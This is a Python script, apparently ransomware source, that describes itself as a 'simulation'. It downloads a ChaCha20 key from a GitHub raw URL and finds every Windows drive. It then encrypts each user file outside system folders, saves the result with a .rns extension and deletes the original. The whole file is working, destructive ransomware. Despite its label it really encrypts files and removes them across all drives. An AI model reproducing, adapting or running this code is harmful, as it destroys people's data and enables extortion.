import os
import base64
import string
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def get_available_drives():
    """Detect all available drives on the system."""
    drives = []
    for drive in string.ascii_uppercase:
        if os.path.exists(f"{drive}:\\"):
            drives.append(f"{drive}:\\")
    return drives

def fetch_key_from_github(raw_url: str) -> bytes:
    """Fetch the encryption key from a GitHub raw URL."""
    response = requests.get(raw_url)
    if response.status_code == 200:
        key = response.content.strip()
        if len(key) != 32:
            raise ValueError("Invalid key length: Key must be 32 bytes for ChaCha20.")
        return key
    else:
        raise ConnectionError(f"Failed to fetch key from GitHub. Status code: {response.status_code}")


def simulate_ransomware_on_drive(drive, key: bytes):
    """Simulate ransomware encryption on a specific drive."""
    excluded_paths = [
        "Windows", "Program Files", "Program Files (x86)", "System Volume Information",
        "Recovery", "PerfLogs", "$Recycle.Bin", "AppData"
    ]
    excluded_extensions = [".exe", ".dll", ".sys", ".ini", ".bat", ".sh", ".tmp", ".lnk", ".rns"]

    """Encrypt a file with ChaCha20."""
    nonce = os.urandom(16)  # Generate a random nonce

    for root, dirs, files in os.walk(drive, topdown=True):
        # Exclude system directories
        dirs[:] = [d for d in dirs if not any(excluded in os.path.join(root, d) for excluded in excluded_paths)]
        
        for file in files:
            # Skip already encrypted files or system-critical file types
            if any(file.endswith(ext) for ext in excluded_extensions):
                continue

            file_path = os.path.join(root, file)
            try:
                # Read file data
                with open(file_path, 'rb') as f:
                    data = f.read()

                cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
                encryptor = cipher.encryptor()
                ciphertext = encryptor.update(data)

                # Rename file with .tst extension
                encrypted_file_path = file_path + ".rns"

                # Write encoded data to the new file
                with open(encrypted_file_path, 'wb') as f:
                    f.write(nonce + ciphertext)

                # Remove the original file
                os.remove(file_path)

                print(f"Encrypted: {encrypted_file_path}")
            except Exception as e:
                print(f"Error processing {file_path}: {e}")


def main():

    try:
         # GitHub raw URL to the key file
        key_url = "https://raw.githubusercontent.com/repel11/ransomtest/refs/heads/main/key.txt"

        # Fetch the encryption key
        key = fetch_key_from_github(key_url)
        print(f"Fetched key: {key.hex()}")

        # Detect all drives
        drives = get_available_drives()
        print(f"Detected drives: {drives}")

        # Process each drive
        for drive in drives:
            print(f"Encrypting files on {drive}")
            simulate_ransomware_on_drive(drive, key)

        print("Encryption simulation complete. The system should remain functional.")
    except Exception as e:
        print(f"Error while starting encryption: {e}")

if __name__ == "__main__":
    main()
